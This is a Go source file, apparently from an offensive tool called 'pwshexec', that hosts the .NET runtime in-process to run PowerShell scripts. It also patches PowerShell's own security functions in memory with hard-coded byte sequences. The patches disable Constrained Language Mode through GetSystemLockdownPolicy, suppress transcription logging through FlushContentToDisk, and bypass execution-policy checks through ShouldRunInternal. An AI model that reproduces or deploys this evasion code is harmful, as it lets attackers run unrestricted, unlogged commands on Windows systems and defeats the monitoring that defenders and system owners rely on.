package main

import (
	"fmt"
	debugger "pwshexec/debug"
	clr "pwshexec/go-buena-clr"
)

var VtPwsh *clr.Variant

var AppDomain *clr.AppDomain

func Startpowershell() (*clr.AppDomain, clr.Variant, error) {
	icorhost, err := clr.LoadCLR("v4")
	if err != nil {
		debugger.Println(err)
	}

	appDomain, err := clr.GetAppDomain(icorhost)
	if err != nil {
		return nil, clr.Variant{}, err
	}
	vtPowershell, err := PowerShellCreate(appDomain)
	if err != nil {
		return nil, clr.Variant{}, err
	}
	return appDomain, vtPowershell, nil
}

func ExecuteScript(appDomain *clr.AppDomain, vtPowershell clr.Variant, script string) (string, error) {

	debugger.Println("Adding script")
	_, err := PowerShellAddScript(appDomain, vtPowershell, script)
	if err != nil && err.Error() != "The operation completed successfully." {
		return err.Error(), err
	}

	debugger.Println("Adding COmmand")
	_, err = PowerShellAddCommand(appDomain, vtPowershell, "Out-String")
	if err != nil && err.Error() != "The operation completed successfully." {
		return err.Error(), err
	}

	debugger.Println("Invoking")
	vtInvokeResult, err := PowerShellInvoke(appDomain, vtPowershell)
	if err != nil && err.Error() != "The operation completed successfully." {
		return err.Error(), err
	}

	if err != nil && err.Error() != "The operation completed successfully." {
		return err.Error(), err
	}

	var res string
	debugger.Println("Invoking Result Print")
	out, err := PrintPowerShellInvokeResult(appDomain, vtInvokeResult)
	if err != nil && err.Error() != "The operation completed successfully." {
		return err.Error(), err
	}

	res += out
	res += "\n\n"

	ers, err := PrintPowerShellInvokeErrors(appDomain, vtPowershell)
	if err != nil && err.Error() != "The operation completed successfully." {
		return err.Error(), err
	}
	res += ers
	res += "\n\n"

	debugger.Println("Invoking Info Print")
	inf, err := PrintPowerShellInvokeInformation(appDomain, vtPowershell)
	if err != nil && err.Error() != "The operation completed successfully." {
		return err.Error(), err
	}
	res += inf

	//err = clr.VariantClear(&vtInvokeResult)
	debugger.Println("Invoking Clear Errors")
	_, err = PowerShellClearErrors(appDomain, vtPowershell)
	if err != nil && err.Error() != "The operation completed successfully." {
		return err.Error(), err
	}
	debugger.Println("Invoking Clear Commands")
	_, err = PowerShellClear(appDomain, vtPowershell)
	if err != nil && err.Error() != "The operation completed successfully." {
		return err.Error(), err
	}




	return res, nil
}

func PatchManagedFunction(appDomain *clr.AppDomain, assemblyName string, className string, methodName string, nbarg uint32, bufbyte []byte) error {
	addr, err := GetFunctionAddressJIT(appDomain, assemblyName, className, methodName, nbarg)
	debugger.Println(fmt.Sprintf("Address of %s", methodName))
	debugger.Println(fmt.Sprintf("%0x", addr))
	if err != nil && err.Error() != "The operation completed successfully." {
		debugger.Println("Error while patching function ->", err.Error())
		return err
	}
	return PatchFunction(addr, bufbyte)

}

func PatchSystemPolicyGetSystemLockdownPolicy(appDomain *clr.AppDomain) error {
	buf := []byte{ 0x48, 0x31, 0xc0, 0xc3 }
	return PatchManagedFunction(appDomain, "System.Management.Automation",
		"System.Management.Automation.Security.SystemPolicy",
		"GetSystemLockdownPolicy", 0, buf)
}

func PatchTranscriptionOptionFlushContentToDisk(appDomain *clr.AppDomain) error {
	buf := []byte{ 0xc3 }
	return PatchManagedFunction(appDomain, "System.Management.Automation",
		"System.Management.Automation.Host.TranscriptionOption",
		"FlushContentToDisk",
		0, buf)
}


func PatchAuthorizationManagerShouldRunInternal(appDomain *clr.AppDomain) error {
	buf := []byte{ 0xc3 }
	return PatchManagedFunction(appDomain, "System.Management.Automation",
        "System.Management.Automation.AuthorizationManager",
        "ShouldRunInternal",
		3, buf)
}
